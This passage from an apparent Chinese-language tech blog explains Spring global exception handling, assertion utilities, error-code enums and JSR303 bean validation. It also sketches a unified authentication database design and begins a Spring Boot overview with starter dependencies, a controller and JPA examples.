<h3 id="1-统一异常处理"><a href="#1-统一异常处理" class="headerlink" title="1.统一异常处理"></a>1.统一异常处理</h3><h4 id="1-1-定义异常"><a href="#1-1-定义异常" class="headerlink" title="1.1.定义异常"></a>1.1.定义异常</h4><p>在开发中，为了保证业务的正确性我们会对业务参数进行校验，不满足要求的参数采用throw new XxxException 来抛出异常，阻止程序继续执行，比如：用户名不可为空，密码错误等。这类异常是需要展示给用户看的，还有一类是程序抛出来的一些未知的异常，如：SQL异常，空指针异常等等，这类异常不能直接抛给用户，而是应该统一捕获后，封装成统一的错误提示返回给用户，如“系统内部异常啦”。</p>
<p>为了把我们手动抛出的异常和系统内部出现的异常区分开，我们需要抛出自定义的异常。通过继承RuntimeException自定义异常。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//全局异常</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GlobleException</span> <span class="keyword">extends</span> <span class="title class_">RuntimeException</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**--------------------------------------------------------</span></span><br><span class="line"><span class="comment">     传一个错误信息给异常对象</span></span><br><span class="line"><span class="comment">     --------------------------------------------------------**/</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">GlobleException</span><span class="params">(String message)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="1-2-使用异常"><a href="#1-2-使用异常" class="headerlink" title="1.2.使用异常"></a>1.2.使用异常</h4><p>在业务中使用自定义的异常来throw异常</p>
<h4 id="1-3-统一捕获异常"><a href="#1-3-统一捕获异常" class="headerlink" title="1.3.统一捕获异常"></a>1.3.统一捕获异常</h4><p>统一捕获异常，使用AOP的思想，解决在controller中大量try-catch重复代码。</p>
<p>在basic-common公共模块，创建全局异常捕获类，通过两个注解来实现异常统一处理</p>
<ul>
<li>@RestControllerAdvice ： 贴在类上，@RestControllerAdvice的增强，同时可以在controller执行前后做一些额外逻辑。</li>
<li>@ExceptionHandler(异常类.class) ：贴在方法上，可捕获指定类型的异常</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**--------------------------------------------------------</span></span><br><span class="line"><span class="comment">全局异常处理</span></span><br><span class="line"><span class="comment"> <span class="doctag">@RestControllerAdvice</span> ：贴在类上，这个类就可以在controller的方法执行前，或者执行后做一些事情</span></span><br><span class="line"><span class="comment"> --------------------------------------------------------**/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//@ControllerAdvice</span></span><br><span class="line"><span class="meta">@RestControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GlobleExceptionHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//拦截异常 : 这个注解就可以拦截器 GlobleException 异常</span></span><br><span class="line">    <span class="meta">@ExceptionHandler(GlobleException.class)</span></span><br><span class="line">    <span class="keyword">public</span> JSONResult <span class="title function_">globleException</span><span class="params">(GlobleException e)</span>&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> JSONResult.error(e.getMessage());</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//拦截器其他异常</span></span><br><span class="line">    <span class="meta">@ExceptionHandler(Exception.class)</span></span><br><span class="line">    <span class="keyword">public</span> JSONResult <span class="title function_">exception</span><span class="params">(Exception e)</span>&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> JSONResult.error(<span class="string">&quot;系统异常,正在殴打程序员...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="2-断言工具抽取"><a href="#2-断言工具抽取" class="headerlink" title="2.断言工具抽取"></a>2.断言工具抽取</h3><p>大量的if(条件)throw new Exception(“异常”) 代码太过冗余，通过断言工具进行抽取,仿照Spring的Assert。</p>
<h4 id="2-1-定义工具"><a href="#2-1-定义工具" class="headerlink" title="2.1.定义工具"></a>2.1.定义工具</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AssertUtil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//断言传入的文本不可为空，否则抛出异常 </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">isNotEmpty</span><span class="params">(String text, String message)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (text == <span class="literal">null</span> || text.trim().length() == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">GlobleException</span>(message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-2-使用断言工具"><a href="#2-2-使用断言工具" class="headerlink" title="2.2.使用断言工具"></a>2.2.使用断言工具</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AssertUtil.isNotEmpty(username,<span class="string">&quot;用户名不能为空&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="3-错误码封装"><a href="#3-错误码封装" class="headerlink" title="3.错误码封装"></a>3.错误码封装</h3><p>系统中有大量的异常信息分散在代码各处，为了方便管理和维护我们可以使用枚举类方便的统一管理起来如</p>
<h4 id="3-1-定义错误码"><a href="#3-1-定义错误码" class="headerlink" title="3.1.定义错误码"></a>3.1.定义错误码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** 系统错误码 **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">ErrorCode</span> &#123;</span><br><span class="line"></span><br><span class="line">    SYSTEM_ERROR(<span class="string">&quot;1001&quot;</span>,<span class="string">&quot;系统内部异常&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//错误码</span></span><br><span class="line">    <span class="keyword">private</span> String code;</span><br><span class="line">    <span class="comment">//错误信息</span></span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    ErrorCode(String code, String message) &#123;</span><br><span class="line">        <span class="built_in">this</span>.code = code;</span><br><span class="line">        <span class="built_in">this</span>.message = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> message+<span class="string">&quot;[&quot;</span>+code+<span class="string">&quot;]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="4-使用Bean-validation-JSR303"><a href="#4-使用Bean-validation-JSR303" class="headerlink" title="4.使用Bean validation(JSR303)"></a>4.使用Bean validation(JSR303)</h3><p>参数校验是我们程序开发中必不可少的过程。用户在前端页面上填写表单时，前端js程序会校验参数的合法性，当数据到了后端，为了防止恶意操作，保持程序的健壮性，后端同样需要对数据进行校验。后端参数校验最简单的做法是直接在业务方法里面进行判断，当判断成功之后再继续往下执行。但这样带给我们的是代码的耦合，冗余。当我们多个地方需要校验时，我们就需要在每一个地方调用校验程序,导致代码很冗余，且不美观。</p>
<p>那么如何优雅的对参数进行校验呢？JSR303就是为了解决这个问题出现的，本篇文章主要是介绍 JSR303，Hibernate Validator 等校验工具的使用，以及自定义校验注解的使用。</p>
<h4 id="4-1-相关注解"><a href="#4-1-相关注解" class="headerlink" title="4.1.相关注解"></a>4.1.相关注解</h4><p>Bean Validation 中内置的 constraint </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">| Constraint                    | 详细信息                                                 |</span><br><span class="line">| :---------------------------- | :------------------------------------------------------- |</span><br><span class="line">| `@Null`                       | 被注释的元素必须为 `null`                                |</span><br><span class="line">| `@NotNull`                    | 被注释的元素必须不为 `null`                              |</span><br><span class="line">| `@AssertTrue`                 | 被注释的元素必须为 `<span class="literal">true</span>`                                |</span><br><span class="line">| `@AssertFalse`                | 被注释的元素必须为 `<span class="literal">false</span>`                               |</span><br><span class="line">| `@Min(value)`                 | 被注释的元素必须是一个数字，其值必须大于等于指定的最小值 |</span><br><span class="line">| `@Max(value)`                 | 被注释的元素必须是一个数字，其值必须小于等于指定的最大值 |</span><br><span class="line">| `@DecimalMin(value)`          | 被注释的元素必须是一个数字，其值必须大于等于指定的最小值 |</span><br><span class="line">| `@DecimalMax(value)`          | 被注释的元素必须是一个数字，其值必须小于等于指定的最大值 |</span><br><span class="line">| `@Size(max, min)`             | 被注释的元素的大小必须在指定的范围内                     |</span><br><span class="line">| `@Digits (<span class="built_in">integer</span>, fraction)` | 被注释的元素必须是一个数字，其值必须在可接受的范围内     |</span><br><span class="line">| `@Past`                       | 被注释的元素必须是一个过去的日期                         |</span><br><span class="line">| `@Future`                     | 被注释的元素必须是一个将来的日期                         |</span><br><span class="line">| `@Pattern(value)`             | 被注释的元素必须符合指定的正则表达式                     |</span><br><span class="line"></span><br><span class="line">Hibernate Validator 附加的 constraint</span><br><span class="line"></span><br><span class="line">| Constraint  | 详细信息                               |</span><br><span class="line">| :---------- | :------------------------------------- |</span><br><span class="line">| `@Email`    | 被注释的元素必须是电子邮箱地址         |</span><br><span class="line">| `@Length`   | 被注释的字符串的大小必须在指定的范围内 |</span><br><span class="line">| `@NotEmpty` | 被注释的字符串的必须非空               |</span><br><span class="line">| `@Range`    | 被注释的元素必须在合适的范围内         |</span><br></pre></td></tr></table></figure>

<h4 id="4-2-对象校验"><a href="#4-2-对象校验" class="headerlink" title="4.2.对象校验"></a>4.2.对象校验</h4><h5 id="1-在参数实体类的字段上注解"><a href="#1-在参数实体类的字段上注解" class="headerlink" title="1.在参数实体类的字段上注解"></a>1.在参数实体类的字段上注解</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@NotEmpty(message = &quot;手机不可为空&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String phone;</span><br></pre></td></tr></table></figure>

<p>在方法的参数前也可以加校验注解</p>
<h5 id="2-在参数实体类前注解"><a href="#2-在参数实体类前注解" class="headerlink" title="2.在参数实体类前注解"></a>2.在参数实体类前注解</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> JSONResult <span class="title function_">register</span><span class="params">(<span class="meta">@RequestBody</span> <span class="meta">@Valid</span> RegisterParamDto dto)</span></span><br></pre></td></tr></table></figure>

<p>@Valid 或者 @Validated都可以标识该类需要进行校验，在类上也可以加该注解。</p>
<h4 id="4-3-参数校验"><a href="#4-3-参数校验" class="headerlink" title="4.3.参数校验"></a>4.3.参数校验</h4><p>举例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Valid</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/user/add&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> JSONResult <span class="title function_">add</span><span class="params">(<span class="meta">@NotEmpty(message = &quot;不可为空&quot;)</span> String username, String password)</span>&#123;</span><br><span class="line">        ...省略...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-4-自定义校验注解【扩展】"><a href="#4-4-自定义校验注解【扩展】" class="headerlink" title="4.4.自定义校验注解【扩展】"></a>4.4.自定义校验注解【扩展】</h4><p>当内置的校验注解不能满足我们时，我们可以选择自定义校验注解</p>
<h5 id="1-定义校验注解"><a href="#1-定义校验注解" class="headerlink" title="1.定义校验注解"></a>1.定义校验注解</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target( ElementType.FIELD)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Constraint(validatedBy = PhoneValidator.class)</span><span class="comment">////此处指定了注解的实现类为ListNotHasNullValidatorImpl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Phone &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    String <span class="title function_">message</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;无效的手机格式&quot;</span>;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt;[] groups() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    Class&lt;? <span class="keyword">extends</span> <span class="title class_">Payload</span>&gt;[] payload() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2-定义校验器"><a href="#2-定义校验器" class="headerlink" title="2.定义校验器"></a>2.定义校验器</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PhoneValidator</span> <span class="keyword">implements</span> <span class="title class_">ConstraintValidator</span>&lt;Phone, String&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PHONE_REGEX</span> <span class="operator">=</span> <span class="string">&quot;^((13[0-9])|(14[5|7])|(15([0-3]|[5-9]))|(17[013678])|(18[0-9]))\\d&#123;8&#125;$&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(Phone constraintAnnotation)</span> &#123;</span><br><span class="line">        <span class="comment">//初始化</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValid</span><span class="params">(String value, ConstraintValidatorContext constraintValidatorContext)</span> &#123;</span><br><span class="line">        <span class="comment">//对值进行手机号正则判断</span></span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">p</span> <span class="operator">=</span> Pattern.compile(PHONE_REGEX);</span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">m</span> <span class="operator">=</span> p.matcher(value);</span><br><span class="line">        <span class="keyword">return</span> m.matches();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="3-使用校验注解"><a href="#3-使用校验注解" class="headerlink" title="3.使用校验注解"></a>3.使用校验注解</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Phone</span></span><br><span class="line"><span class="keyword">private</span> String phone;</span><br></pre></td></tr></table></figure>

<h4 id="4-5-分组校验【扩展】"><a href="#4-5-分组校验【扩展】" class="headerlink" title="4.5.分组校验【扩展】"></a>4.5.分组校验【扩展】</h4><p>同一个实体在不同的业务中做的校验规则也不一样，这个时候可以采用分组校验</p>
<h5 id="1-定义不同的校验接口"><a href="#1-定义不同的校验接口" class="headerlink" title="1.定义不同的校验接口"></a>1.定义不同的校验接口</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 可以在一个Model上面添加多套参数验证规则，此接口定义添加Person模型新增时的参数校验规则</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">PersonAddView</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 可以在一个Model上面添加多套参数验证规则，此接口定义添加Person模型修改时的参数校验规则</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">PersonModifyView</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2-Model指明分组"><a href="#2-Model指明分组" class="headerlink" title="2.Model指明分组"></a>2.Model指明分组</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> id;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 添加groups 属性，说明只在特定的验证规则里面起作用，不加则表示在使用Deafault规则时起作用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@NotNull(groups = &#123;PersonAddView.class, PersonModifyView.class&#125;, </span></span><br><span class="line"><span class="meta">             message = &quot;添加、修改用户时名字不能为空&quot;, payload = ValidateErrorLevel.Info.class)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@NotNull(groups = &#123;PersonAddView.class&#125;, message = &quot;添加用户时地址不能为空&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Max(value = 30, groups = &#123;PersonModifyView.class&#125;, message = &quot;姓名不能超过30岁&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="3-启用校验"><a href="#3-启用校验" class="headerlink" title="3.启用校验"></a>3.启用校验</h5><p>此时启用校验和之前的不同,需要指明启用哪一组规则</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 添加一个Person对象</span></span><br><span class="line"><span class="comment">     * 此处启用PersonAddView 这个验证规则</span></span><br><span class="line"><span class="comment">     * 备注：此处<span class="doctag">@Validated</span>(PersonAddView.class) 表示使用PersonAndView这套校验规则，若使用<span class="doctag">@Valid</span> 则表示使用默认校验规则，</span></span><br><span class="line"><span class="comment">     * 若两个规则同时加上去，则只有第一套起作用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/person&quot;, method = RequestMethod.POST)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addPerson</span><span class="params">(<span class="meta">@RequestBody</span> <span class="meta">@Validated(&#123;PersonAddView.class, Default.class&#125;)</span> Person person)</span> &#123;</span><br><span class="line">        System.out.println(person.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 修改Person对象</span></span><br><span class="line"><span class="comment">     * 此处启用PersonModifyView 这个验证规则</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/person&quot;, method = RequestMethod.PUT)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">modifyPerson</span><span class="params">(<span class="meta">@RequestBody</span> <span class="meta">@Validated(value = &#123;PersonModifyView.class&#125;)</span> Person person)</span> &#123;</span><br><span class="line">        System.out.println(person.toString());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="二-统一认证中心"><a href="#二-统一认证中心" class="headerlink" title="二.统一认证中心"></a>二.统一认证中心</h2><h3 id="1-统一认证设计"><a href="#1-统一认证设计" class="headerlink" title="1.统一认证设计"></a>1.统一认证设计</h3><h4 id="1-1-问题描述"><a href="#1-1-问题描述" class="headerlink" title="1.1.问题描述"></a>1.1.问题描述</h4><p>系统分为前台用户，后台用户，登录如何设计，用户模型如何设计？</p>
<ul>
<li>方案一：前后台用户彻底分开，前台一套用户模型，后台一套用户模型。好处是安全性好，前后台用户互不干扰。坏处是：前后台用户大量重复的字段，重复的功能如登录重复写。不方便统一管理。</li>
<li>方案二：将前后台用户统一管理，抽取相同的登录模型，实现统一的认证逻辑，统一认证中心。</li>
</ul>
<h4 id="1-2-数据库设计"><a href="#1-2-数据库设计" class="headerlink" title="1.2.数据库设计"></a>1.2.数据库设计</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">源码云课堂用户相关数据设计：</span><br><span class="line">├── ymcc-uaa             //认证中心数据库 </span><br><span class="line">│       └── t_login           ：公共的登录表，主要保存登录信息</span><br><span class="line">│       └── t_login_role      ：用户和角色关系表</span><br><span class="line">│       └── t_role            ：角色表</span><br><span class="line">│       └── t_role_permission ：角色权限关系表</span><br><span class="line">│       └── t_permission      ：权限表</span><br><span class="line">│       └── t_meal            ：菜单表</span><br><span class="line">├── ymcc-system         //管理系统数据库</span><br><span class="line">│       └── t_employee     ：后台用户表 ，和t_login 关联一对一， 保存后台用户特有的字段</span><br><span class="line">│       └── t_department   ：部门表</span><br><span class="line">├── ymcc-user           //用户数据库</span><br><span class="line">│       └── t_user         ：前台用户表 ，和t_login 关联一对一 ，保存前台用户特有的字段</span><br><span class="line">│       └── t_user_base_info    ：前台用户基本信息表,和t_user 关联一对一 </span><br><span class="line">│       └── t_user_account ：前台用户账户表,和t_user 关联一对一 </span><br></pre></td></tr></table></figure>

<p>数据库关系如下<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Exception/databaseRelation.png"></p>
<h4 id="1-3-登录注册流程图"><a href="#1-3-登录注册流程图" class="headerlink" title="1.3.登录注册流程图"></a>1.3.登录注册流程图</h4><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Exception/loginRegister.png"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Exception</tag>
        <tag>JSR303</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot学习总结</title>
    <url>/2024/06/11/SpringBoot%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="什么是SpringBoot"><a href="#什么是SpringBoot" class="headerlink" title="什么是SpringBoot"></a>什么是SpringBoot</h1><p><a href="https://spring.io/projects/spring-boot">SpringBoot官网</a><br><font size = 3><br>Spring Boot是一个用于构建独立、生产级别的Java应用程序的开源框架。它是Spring Framework的一部分，旨在简化Spring应用程序的开发和部署过程。</p>
<p>Spring Boot提供了自动配置（auto-configuration）的功能，通过这种方式，开发人员可以使用少量的配置来快速构建应用程序。它还提供了一个内嵌的服务器，例如Tomcat或Jetty，使得应用程序可以直接运行而无需部署到外部服务器上。</p>
<p>Spring Boot还提供了一组丰富的起步依赖（starter dependencies），这些依赖项可以帮助开发人员快速集成常见的技术栈，如数据库访问、安全认证、Web开发等。开发人员只需引入相应的起步依赖，Spring Boot会自动进行相关配置和集成，大大简化了开发流程。</p>
<p>Spring Boot的设计理念是约定优于配置（Convention over Configuration），它提供了默认的配置和约定，使得开发人员可以专注于业务逻辑而不必过多关注底层的配置细节。同时，Spring Boot也支持自定义配置，以满足特定需求。<br></font></p>
<h1 id="SpringBoot为什么流行"><a href="#SpringBoot为什么流行" class="headerlink" title="SpringBoot为什么流行"></a>SpringBoot为什么流行</h1><h2 id="简化配置"><a href="#简化配置" class="headerlink" title="简化配置"></a>简化配置</h2><p>Spring Boot采用约定优于配置的原则，提供了默认的配置和自动配置功能。开发人员不需要手动配置大量的XML文件或繁琐的注解，而是通过少量的配置即可快速构建应用程序。举个例子：</p>
<p>假设我们要创建一个简单的RESTful API，我们需要使用Spring MVC来处理HTTP请求和响应。在传统的Spring项目中，我们需要手动配置DispatcherServlet、ViewResolver等组件，以及编写一些XML配置文件。</p>
<p>但是在使用Spring Boot时，我们只需要进行少量的配置即可实现相同的功能。首先，我们需要添加spring-boot-starter-web依赖，它包含了Spring MVC的所有必要依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后我们创建一个简单的Controller来处理请求</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorldController</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@GetMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在上述代码中，我们使用@RestController注解将该类标记为一个Controller，并使用@GetMapping注解定义了一个处理GET请求的方法。</p>
<p>最后，我们只需要运行该应用程序，Spring Boot会自动检测到我们的代码，并根据约定进行自动配置。它会自动创建一个内嵌的Tomcat服务器，并将我们的应用程序部署在其中。</p>
<p>现在，我们可以通过访问<a href="http://localhost:8080/hello%E6%9D%A5%E6%B5%8B%E8%AF%95%E6%88%91%E4%BB%AC%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%AE%83%E5%B0%86%E8%BF%94%E5%9B%9E%22Hello">http://localhost:8080/hello来测试我们的应用程序，它将返回&quot;Hello</a>, World!”作为响应。</p>
<p>通过这个例子，我们可以看到Spring Boot通过约定优于配置的原则，大大简化了我们的开发过程。我们只需要关注业务逻辑的实现，而不需要手动配置大量的组件和文件。Spring Boot会根据约定自动完成这些工作</p>
<h2 id="快速开发"><a href="#快速开发" class="headerlink" title="快速开发"></a>快速开发</h2><p>Spring Boot提供了丰富的起步依赖（starter dependencies），这些依赖项预先配置了常见的技术栈，如数据库访问、安全认证、Web开发等。开发人员只需引入相应的起步依赖，即可快速集成这些技术，大大减少了开发时间和工作量。</p>
<p>假设我们需要在项目中使用数据库进行数据持久化操作。在传统的Spring项目中，我们需要手动配置数据源、事务管理器等组件，并引入相应的数据库驱动。</p>
<p>但是在使用Spring Boot时，我们可以通过引入相应的起步依赖来快速集成数据库技术。以MySQL为例，我们只需要添加spring-boot-starter-data-jpa和mysql-connector-java这两个依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过引入spring-boot-starter-data-jpa依赖，Spring Boot会自动配置JPA相关的组件，包括数据源、实体管理器等。而mysql-connector-java依赖则提供了MySQL数据库的驱动程序。</p>
<p>接下来，我们可以定义一个简单的实体类，使用JPA注解进行映射：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 省略getter和setter</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后，我们可以创建一个简单的Repository接口来进行数据库操作：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserRepository</span> <span class="keyword">extends</span> <span class="title class_">JpaRepository</span>&lt;User, Long&gt; &#123;</span><br><span class="line">    </span><br><span class="line">    User <span class="title function_">findByUsername</span><span class="params">(String username)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在上述代码中，我们使用@Repository注解将该接口标记为一个Repository，并继承了JpaRepository接口，它提供了一些常用的数据库操作方法。</p>
<p>现在，我们可以在其他地方使用UserRepository进行数据库操作，而不需要手动编写SQL语句或配置数据源等。</p>
